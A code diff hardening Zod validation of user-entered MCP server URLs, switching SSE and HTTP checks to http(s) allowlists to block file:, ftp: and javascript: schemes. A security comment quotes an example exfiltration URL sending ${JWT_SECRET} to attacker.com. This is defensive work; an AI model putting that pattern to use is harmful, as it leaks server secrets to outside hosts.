@@ -224,11 +224,8 @@ const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T
   });
 
 const envVarPattern = /\$\{[^}]+\}/;
-
-const isWsProtocol = (val: string): boolean => {
-  const { protocol } = new URL(val);
-  return protocol === 'ws:' || protocol === 'wss:';
-};
+const isWsProtocol = (val: string): boolean => /^wss?:/i.test(val);
+const isHttpProtocol = (val: string): boolean => /^https?:/i.test(val);
 
 /**
  * Builds a URL schema for user input that rejects ${VAR} env variable patterns
@@ -256,19 +253,18 @@ const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string)
  * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
  * extractEnvVariable transform to prevent env variable exfiltration
  * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
+ * Protocol checks use positive allowlists (http(s) / ws(s)) to block
+ * file://, ftp://, javascript:, and other non-network schemes.
  */
 export const MCPServerUserInputSchema = z.union([
   omitServerManagedFields(WebSocketOptionsSchema).extend({
-    url: userUrlSchema(isWsProtocol, 'WebSocket URL must start with ws:// or wss://'),
+    url: userUrlSchema(isWsProtocol, 'WebSocket URL must use ws:// or wss://'),
   }),
   omitServerManagedFields(SSEOptionsSchema).extend({
-    url: userUrlSchema((val) => !isWsProtocol(val), 'SSE URL must not start with ws:// or wss://'),
+    url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
   }),
   omitServerManagedFields(StreamableHTTPOptionsSchema).extend({
-    url: userUrlSchema(
-      (val) => !isWsProtocol(val),
-      'Streamable HTTP URL must not start with ws:// or wss://',
-    ),
+    url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
   }),
 ]);
 
